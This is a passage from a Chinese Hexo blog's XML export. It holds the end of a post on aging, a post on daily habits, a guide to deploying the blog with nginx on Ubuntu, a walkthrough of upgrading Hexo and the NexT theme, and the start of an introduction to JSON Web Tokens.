<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>我们都会变老。</p>
<blockquote>
<p><em><strong>每时每刻都在恶化！</strong></em></p>
</blockquote>
<p>这意味着我们可以制定计划并考虑我们的未来。</p>
<blockquote>
<p>坟墓</p>
</blockquote>
<p>在这一点上，睡个好觉。</p>
]]></content>
      <categories>
        <category>Career</category>
      </categories>
  </entry>
  <entry>
    <title>改变我开发者职业生涯的一个小日常实践</title>
    <url>/2022/11/career-web-dev/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>大多数人<em>高估</em>了他们在一个月内可以做的事情。大多数人都<em>低估</em>了他们一年能做的事情。</p>
<h2 id="日常练习"><a href="#日常练习" class="headerlink" title="日常练习"></a>日常练习</h2><p>每天坚持不懈地做某事比你允许失败的巨大努力产生更多的结果。</p>
<span id="more"></span>

<p>纪律胜过动力。每次。</p>
<p>这是一个重要的教训。您可以在生活中以多种方式应用它。从长远来看，每天进行一点冥想可以带来平静。每天读几页，突然间你每年读几本书。每天散步，你会更健康。</p>
<p>每天编写一些新代码，您将在软件开发方面变得更好！</p>
<p>您可能已经通过关注此博客注意到：我每天早上都写。这是一种一贯的做法，已经成为令人惊奇的事情。</p>
<p>建立日常工作。每天做点小事。</p>
<h2 id="结束所有习惯的习惯"><a href="#结束所有习惯的习惯" class="headerlink" title="结束所有习惯的习惯"></a>结束所有习惯的习惯</h2><p>就生产力习惯而言，彻底改变我的世界的一个习惯是在我完成日常练习之前不检查电子邮件。</p>
<p>避免电子邮件（或社交媒体&#x2F;新闻&#x2F;等）的干扰。</p>
<p>做你的日常练习，你的一天在早上的第一件事就是富有成效。那天你所做的一切都是奖励！</p>
<h2 id="选择一个优先级"><a href="#选择一个优先级" class="headerlink" title="选择一个优先级"></a>选择一个优先级</h2><p>日常实践的另一种变化……</p>
<p>前一天晚上，写下明天要完成的一件事——对你面临的项目&#x2F;问题影响最大的一件事。</p>
<p>什么任务，如果完成了，会让你放松心情，改善你的职业生涯，或者最有益于你的健康。</p>
<blockquote>
<p><em>如果你明天只能做一件事，那会是什么？</em></p>
</blockquote>
<p>把那件事记在你的笔记本上。睡觉。明天醒来，<strong>先做那件事。</strong></p>
<h2 id="复利效应"><a href="#复利效应" class="headerlink" title="复利效应"></a>复利效应</h2><p>我们可以将日常练习的复合效应应用到任何习惯中。如果经常练习，任何习惯都可以改变生活——包括坏习惯。</p>
<p>每天跑步会改变你的身体，每天吸烟也会。</p>
<p>这篇文章最重要的收获应该是：选择一个好习惯并坚持下去，它将改变你的生活。</p>
<p>有些人喜欢写作。其他人喜欢做饭。许多人喜欢运动。阅读一些东西，静静地坐着，散散步，结交新朋友。</p>
<p>选择一个并始终如一地做。让复合效应完成剩下的工作。</p>
<p>这将改变你的生活。</p>
]]></content>
      <categories>
        <category>Career</category>
      </categories>
  </entry>
  <entry>
    <title>Hexo 博客部署</title>
    <url>/2022/11/hexo-blog-server/</url>
    <content><![CDATA[<h2 id="Ubuntu-Nginx-安装"><a href="#Ubuntu-Nginx-安装" class="headerlink" title="Ubuntu Nginx 安装"></a>Ubuntu Nginx 安装</h2><ol>
<li>Ubuntu 22.04数据包更新</li>
<li>安装 <code>nginx</code> 核心版本</li>
<li>运行 <code>nginx</code> 服务<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> apt update</span><br><span class="line"><span class="variable">$</span> apt upgrade</span><br><span class="line"><span class="variable">$</span> apt install nginx<span class="literal">-core</span></span><br><span class="line"><span class="variable">$</span> systemctl <span class="built_in">start</span> nginx.service</span><br><span class="line"><span class="variable">$</span> systemctl status nginx.service</span><br></pre></td></tr></table></figure></li>
</ol>
<span id="more"></span>

<h2 id="配置网站代码"><a href="#配置网站代码" class="headerlink" title="配置网站代码"></a>配置网站代码</h2><p>拉取博客仓库代码到 <code>/var/www/gitslagga.github.io</code> 目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /var/www</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/gitslagga/gitslagga.github.io.git</span></span><br></pre></td></tr></table></figure>

<h2 id="Hexo-Nginx-配置"><a href="#Hexo-Nginx-配置" class="headerlink" title="Hexo Nginx 配置"></a>Hexo Nginx 配置</h2><ol>
<li>创建博客配置文件 <code>/etc/conf.d/blog.conf</code></li>
<li>因为已经在外部为域名配置证书，在这里只要监听 80 端口就好了</li>
<li>配置域名 <code>slagga.top</code>，这样可以处理不同的域名请求</li>
<li>设置默认网页 <code>index.html index.htm</code> 等</li>
<li>配置网站代码，就是刚刚拉去的博客仓库代码</li>
<li>配置网站 <code>403</code> 和 <code>404</code> 错误请求，我没编写 <code>403.html</code>，在这里我统一指向了 <code>404.html</code></li>
<li>为了使用方面（谷歌分析）这里把 <code>www</code> 二级域名重定向到一级域名下面<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">server_name</span> slagga.top;</span><br><span class="line">        </span><br><span class="line">        <span class="attribute">index</span> index.html index.htm index.nginx-debian.html;</span><br><span class="line">        <span class="attribute">root</span> /var/www/gitslagga.github.io;</span><br><span class="line">        <span class="attribute">error_page</span> <span class="number">403</span> /<span class="number">404</span>.html;</span><br><span class="line">        <span class="attribute">error_page</span> <span class="number">404</span> /<span class="number">404</span>.html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">server_name</span> www.slagga.top;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> https://slagga.top<span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="博客网站启动运行"><a href="#博客网站启动运行" class="headerlink" title="博客网站启动运行"></a>博客网站启动运行</h2><ol>
<li><p>检测 <code>nginx</code> 服务状态</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>nginx -t</span><br></pre></td></tr></table></figure>
</li>
<li><p>平滑重启服务</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>nginx -s reload</span><br></pre></td></tr></table></figure>
</li>
<li><p>访问网站 <a href="https://slagga.top/">slagga.top</a> 或者 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2xhZ2dhLnRvcC8=">www.slagga.top<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ol>
<h2 id="Hexo-配置补充"><a href="#Hexo-配置补充" class="headerlink" title="Hexo 配置补充"></a>Hexo 配置补充</h2><ol>
<li>代码块的颜色让人面如死灰，我也找不到合适的语言去匹配它，比如刚刚的 <code>nginx.conf</code>。</li>
<li>在这里我开启了自动检测，这样代码块就配置语法高亮，自动匹配合适的语言。</li>
</ol>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>auto_detect 非常耗费资源。 不要启用它，除非你真的需要“子语言高亮”或者在编写代码块时不想标记语言。</p>
</blockquote>
<p>Have a nice day, Happy Coding. </p>
]]></content>
      <categories>
        <category>Website</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Next</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 博客升级</title>
    <url>/2022/11/hexo-blog-upgrade/</url>
    <content><![CDATA[<h2 id="升级原因"><a href="#升级原因" class="headerlink" title="升级原因"></a>升级原因</h2><ol>
<li>模版 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0">theme-next<i class="fa fa-external-link-alt"></i></span> 最后版本是 <code>7.8.0</code>，几月未更新。现在迁移到 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25leHQtdGhlbWUvaGV4by10aGVtZS1uZXh0">hexo-theme<i class="fa fa-external-link-alt"></i></span> 最后版本是 <code>8.13.2</code>，目前为止。</li>
<li><code>hexo-theme</code> 可以模版可以放在 <code>themes</code> 文件下面，也可以使用 <code>npm</code> 安装。</li>
<li><code>hexo</code> 从版本 <code>5.0.0</code> 升级到 <code>6.3.0</code>。</li>
</ol>
<span id="more"></span>

<h2 id="升级步骤"><a href="#升级步骤" class="headerlink" title="升级步骤"></a>升级步骤</h2><h2 id="1-升级-node-和-hexo-到当前新版本"><a href="#1-升级-node-和-hexo-到当前新版本" class="headerlink" title="1. 升级 node 和 hexo 到当前新版本"></a>1. 升级 <code>node</code> 和 <code>hexo</code> 到当前新版本</h2><p>升级 <code>node</code> 版本，目前是 <code>18.12.1</code></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">$ nvm install <span class="comment">--lts</span></span><br><span class="line">$ nvm <span class="keyword">use</span> <span class="comment">--lts</span></span><br></pre></td></tr></table></figure>
<p>升级 <code>hexo</code> 版本，目前是 <code>6.3.0</code></p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">$ npm uninstall -g hexo-<span class="keyword">cli</span></span><br><span class="line">$ npm install -g hexo-<span class="keyword">cli</span></span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv">官网<i class="fa fa-external-link-alt"></i></span> 有 <code>hexo</code> 需要的最低 <code>node</code> 版本要求。</p>
<h2 id="2-初始化博客目录"><a href="#2-初始化博客目录" class="headerlink" title="2. 初始化博客目录"></a>2. 初始化博客目录</h2><p>在这里，我没有在旧仓库中基础上开发升级，而是创建一个新的项目，升级完成后进行覆盖。因为包依赖版本有所不同，模版文件也不同。<br>博客项目初始化。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> hexo init &lt;folder&gt;</span><br><span class="line"><span class="variable">$</span> <span class="built_in">cd</span> &lt;folder&gt;</span><br><span class="line"><span class="variable">$</span> npm install</span><br></pre></td></tr></table></figure>

<h2 id="3-安装-hexo-theme-模版"><a href="#3-安装-hexo-theme-模版" class="headerlink" title="3. 安装 hexo-theme 模版"></a>3. 安装 <code>hexo-theme</code> 模版</h2><p>使用 <code>npm</code> 安装 <code>hexo-theme</code> 模版。</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>npm install hexo-theme-<span class="keyword">next</span></span><br></pre></td></tr></table></figure>
<p>或者存放在仓库中，安装到 <code>hexo-theme</code> 模版到 <code>themes</code> 目录。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">$ git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/next-theme/</span>hexo-theme-<span class="keyword">next</span> themes/<span class="keyword">next</span></span><br></pre></td></tr></table></figure>

<h2 id="4-复制已创作的博客文章-source"><a href="#4-复制已创作的博客文章-source" class="headerlink" title="4. 复制已创作的博客文章 source"></a>4. 复制已创作的博客文章 <code>source</code></h2><p>删除新目录自带的 <code>Hello World</code> 文章，复制之前的博客文章到新的目录下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">rm</span> -rf <span class="built_in">source</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ..</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> -r &lt;old-folder&gt;/source</span></span><br></pre></td></tr></table></figure>

<h2 id="5-修改个人配置，添加模版配置"><a href="#5-修改个人配置，添加模版配置" class="headerlink" title="5. 修改个人配置，添加模版配置"></a>5. 修改个人配置，添加模版配置</h2><p>修改博客网站配置文件 <code>_config.yml</code>， 大部分内容没有变化，有些自定的配置需要修改。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">计算机那些事</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">如果它不应该发生，它就不会发生</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">计算机那些事</span> <span class="bullet">-</span> <span class="string">个人博客网站，涵盖领域包括IT技术、区块链技术、技术观点等</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="string">Blog,</span> <span class="string">HTML,</span> <span class="string">CSS,</span> <span class="string">JavaScript,</span> <span class="string">Python,</span> <span class="string">Php,</span> <span class="string">Java,</span> <span class="string">Go,</span> <span class="string">Redis,</span> <span class="string">MySQL,</span> <span class="string">Node.js,</span> <span class="string">React,</span> <span class="string">Vuejs,</span> <span class="string">Git,</span> <span class="string">Programming,</span> <span class="string">Web</span> <span class="string">Development,</span> <span class="string">Blockchain</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">Slagga</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://gitslagga.github.com</span></span><br><span class="line"></span><br><span class="line"><span class="string">......</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:gitslagga/gitslagga.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<p>添加模版配置文件 <code>_config.next.yml</code>。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">since:</span> <span class="number">2015</span></span><br><span class="line"></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Pisces</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">https://avatars.githubusercontent.com/u/19620432</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/gitslagga</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:slagga@duck.com</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-envelope</span></span><br><span class="line"></span><br><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">style:</span> <span class="string">mac</span></span><br><span class="line"></span><br><span class="line"><span class="attr">back2top:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">scrollpercent:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">github_banner:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">permalink:</span> <span class="string">&#x27;https://github.com/gitslagga&#x27;</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">&#x27;Follow me on GitHub&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">font:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">global:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">family:</span> <span class="string">Monda</span></span><br><span class="line"></span><br><span class="line"><span class="attr">comments:</span></span><br><span class="line">  <span class="attr">active:</span> <span class="string">gitalk</span></span><br><span class="line"></span><br><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">github_id:</span> <span class="string">gitslagga</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">gitslagga.github.io</span></span><br><span class="line">  <span class="attr">client_id:</span> <span class="string">******</span></span><br><span class="line">  <span class="attr">client_secret:</span> <span class="string">******</span></span><br><span class="line">  <span class="attr">admin_user:</span> <span class="string">gitslagga</span> </span><br><span class="line">  <span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="6-安装博客功能插件"><a href="#6-安装博客功能插件" class="headerlink" title="6. 安装博客功能插件"></a>6. 安装博客功能插件</h2><ul>
<li>安装文章搜索插件<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">$ npm <span class="keyword">install</span> hexo-generator-searchdb</span><br></pre></td></tr></table></figure></li>
<li>安装远程仓库推送插件<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">$ npm <span class="keyword">install</span> hexo-deployer-git</span><br></pre></td></tr></table></figure></li>
<li>安装 <code>gitalk</code> 文章评论插件<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">$ npm <span class="keyword">install</span> gitalk</span><br></pre></td></tr></table></figure>
<a href="%60https://hexo.io/plugins/%60"><code>Hexo</code> 官方插件列表</a>。</li>
</ul>
<h2 id="7-更换仓库，提交代码"><a href="#7-更换仓库，提交代码" class="headerlink" title="7. 更换仓库，提交代码"></a>7. 更换仓库，提交代码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> ../&lt;old-site&gt;/.git .</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add -A</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit -m <span class="string">&quot;update hexo and next version&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push</span></span><br></pre></td></tr></table></figure>

<h2 id="8-Github-Page-推送"><a href="#8-Github-Page-推送" class="headerlink" title="8. Github Page 推送"></a>8. <code>Github Page</code> 推送</h2><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo <span class="keyword">generate</span></span><br><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<h2 id="9-博客网站优化"><a href="#9-博客网站优化" class="headerlink" title="9. 博客网站优化"></a>9. 博客网站优化</h2><ol>
<li>页面局部刷新使用 <code>pjax: true</code>。</li>
<li>图像和视频支持使用 <code>fancybox: true</code>。</li>
<li>为汉字和英文数字之间添加空格使用 <code>pangu: true</code>。</li>
<li>部署后在 <code>Github</code> 中出现 <code>ReferenceError: velocity is not defined</code> 错误，网站无法访问。<br>需要在 <code>_config.next.yml</code> 中配置以下内容：<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">......</span></span><br><span class="line"></span><br><span class="line"><span class="attr">motion:</span></span><br><span class="line">  <span class="attr">async:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">vendors:</span></span><br><span class="line">  <span class="attr">internal:</span> <span class="string">cdnjs</span></span><br><span class="line">  <span class="attr">plugins:</span> <span class="string">cdnjs</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="10-添加-Google-配置"><a href="#10-添加-Google-配置" class="headerlink" title="10. 添加 Google 配置"></a>10. 添加 <code>Google</code> 配置</h2><p>使用 <code>Google Analytics</code>，申请地址是 <span class="exturl" data-url="aHR0cHM6Ly9hbmFseXRpY3MuZ29vZ2xlLmNvbS8=">谷歌分析<i class="fa fa-external-link-alt"></i></span>。</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">google<span class="emphasis">_analytics:</span></span><br><span class="line"><span class="emphasis">  tracking_</span>id: G-<span class="strong">*****</span>*</span><br></pre></td></tr></table></figure>
<p>合并重复的 <code>url</code> 链接。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">index_with_subtitle:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>所有外部链接都是跨链接。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">exturl:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>使用 <code>Google Webmasters</code>，申请地址是 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS93ZWJtYXN0ZXJzL3Rvb2xz">谷歌站长工具<i class="fa fa-external-link-alt"></i></span>。</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">google_site_verification: <span class="strong">*****</span><span class="strong">*-*</span><span class="strong">*****</span></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>整个过程还是比较繁琐，坚持就是胜利。</li>
<li><code>Next</code> 的配置有一些变化，增加了些配置，消减了些配置，比如：<code>codeblock: highlight_theme</code>。</li>
<li>我的 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dpdHNsYWdnYQ==">Github<i class="fa fa-external-link-alt"></i></span>，欢迎 <code>Follow</code>。</li>
<li><a href="https://theme-next.js.org/">更多 <code>Next</code> 官方配置帮助文档</a></li>
</ol>
<p>Have a nice day, Happy Coding. </p>
]]></content>
      <categories>
        <category>Website</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Next</tag>
      </tags>
  </entry>
  <entry>
    <title>JSON Web Token 简介</title>
    <url>/2022/11/json-web-token/</url>
    <content><![CDATA[<h2 id="什么是-JSON-Web-令牌？"><a href="#什么是-JSON-Web-令牌？" class="headerlink" title="什么是 JSON Web 令牌？"></a>什么是 JSON Web 令牌？</h2><p>JSON Web Token (JWT) 是一种开放标准 ( <span class="exturl" data-url="aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc1MTk=">RFC 7519<i class="fa fa-external-link-alt"></i></span> )，它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为 JSON 对象。此信息可以被验证和信任，因为它是经过数字签名的。JWT 可以使用保密（使用<strong>HMAC</strong>算法）或使用<strong>RSA</strong>或<strong>ECDSA</strong>的公钥&#x2F;私钥对进行签名。</p>
<p>尽管可以对 JWT 进行加密以在各方之间提供保密性，但我们将重点关注<em>已签名</em>的令牌。签名令牌可以验证其中包含的声明的<em>完整性</em>，而加密令牌可以向其他方<em>隐藏</em>这些声明。当使用公钥&#x2F;私钥对对令牌进行签名时，签名还证明只有持有私钥的一方才是签名者。</p>
<span id="more"></span>

<h2 id="什么时候应该使用-JSON-Web-Tokens？"><a href="#什么时候应该使用-JSON-Web-Tokens？" class="headerlink" title="什么时候应该使用 JSON Web Tokens？"></a>什么时候应该使用 JSON Web Tokens？</h2><p>以下是 JSON Web Tokens 有用的一些场景：</p>
<ul>
<li><p><strong>授权</strong>：这是使用 JWT 最常见的场景。用户登录后，每个后续请求都将包含 JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是如今广泛使用 JWT 的一项功能，因为它的开销很小并且能够轻松跨不同域使用。</p>
</li>
<li><p><strong>信息交换</strong>：JSON Web Tokens 是在各方之间安全传输信息的好方法。因为 JWT 可以签名——例如，使用公钥&#x2F;私钥对——你可以确定发送者是他们所说的人。此外，由于签名是使用标头和有效负载计算的，因此您还可以验证内容是否未被篡改。</p>
</li>
</ul>
<h2 id="什么是-JSON-Web-Token-结构？"><a href="#什么是-JSON-Web-Token-结构？" class="headerlink" title="什么是 JSON Web Token 结构？"></a>什么是 JSON Web Token 结构？</h2><p>在其紧凑的形式中，JSON Web Tokens 由三部分组成，由点 ( <code>.</code>) 分隔，它们是：</p>
<ul>
<li>标头</li>
<li>有效载荷</li>
<li>签名</li>
</ul>
<p>因此，JWT 通常如下所示。</p>
<p><code>xxxxx.yyyyy.zzzzz</code></p>
<p>让我们分解不同的部分。</p>
<h3 id="标头"><a href="#标头" class="headerlink" title="标头"></a>标头</h3><p>标头<em>通常</em>由两部分组成：令牌的类型，即 JWT，以及所使用的签名算法，例如 HMAC SHA256 或 RSA。</p>
<p>例如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后，这个 JSON 被<strong>Base64Url</strong>编码以形成 JWT 的第一部分。</p>
<h3 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h3><p>令牌的第二部分是有效负载，其中包含声明。声明是关于实体（通常是用户）和附加数据的声明。声明分为三种类型：<em>注册</em>声明、<em>公共</em>声明和<em>私人</em>声明。</p>
<ul>
<li><p><a href="https://tools.ietf.org/html/rfc7519#section-4.1"><strong>已注册声明</strong></a>：这些是一组预定义的声明，它们不是强制性的，但建议使用，以提供一组有用的、可互操作的声明。其中一些是：<strong>iss</strong>（发行者）、<strong>exp</strong>（到期时间）、<strong>sub</strong>（主题）、<strong>aud</strong>（受众）和 <span class="exturl" data-url="aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc1MTkjc2VjdGlvbi00LjE=">其他<i class="fa fa-external-link-alt"></i></span>。</p>
<blockquote>
<p>请注意，声明名称只有三个字符长，因为 JWT 是为了紧凑。</p>
</blockquote>
</li>
<li><p><a href="https://tools.ietf.org/html/rfc7519#section-4.2"><strong>公共声明</strong></a>：这些可以由使用 JWT 的人随意定义。但为了避免冲突，它们应该在 <span class="exturl" data-url="aHR0cHM6Ly93d3cuaWFuYS5vcmcvYXNzaWdubWVudHMvand0L2p3dC54aHRtbA==">IANA JSON Web 令牌注册表<i class="fa fa-external-link-alt"></i></span> 中定义，或者定义为包含一个抗冲突的命名空间的 URI。</p>
</li>
<li><p><a href="https://tools.ietf.org/html/rfc7519#section-4.3"><strong>私人声明</strong></a>：这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，既不是<em>注册</em>声明也不是<em>公共</em>声明。</p>
</li>
</ul>
<p>一个示例有效载荷可以是：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后，有效负载经过<strong>Base64Url</strong>编码，形成 JSON Web Token 的第二部分。</p>
<blockquote>
<p>请注意，对于签名的令牌，此信息虽然受到防止篡改的保护，但任何人都可以读取。除非加密，否则不要将秘密信息放入 JWT 的有效负载或标头元素中。</p>
</blockquote>
<h3 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h3><p>要创建签名部分，您必须采用编码标头、编码有效负载、秘密、标头中指定的算法，然后对其进行签名。</p>
<p>例如，如果要使用 HMAC SHA256 算法，将按以下方式创建签名：</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  <span class="name">base64UrlEncode</span>(<span class="name">header</span>) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(<span class="name">payload</span>),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>

<p>签名用于验证消息在此过程中没有被更改，并且在使用私钥签名的令牌的情况下，它还可以验证 JWT 的发送者是否如其所说。</p>
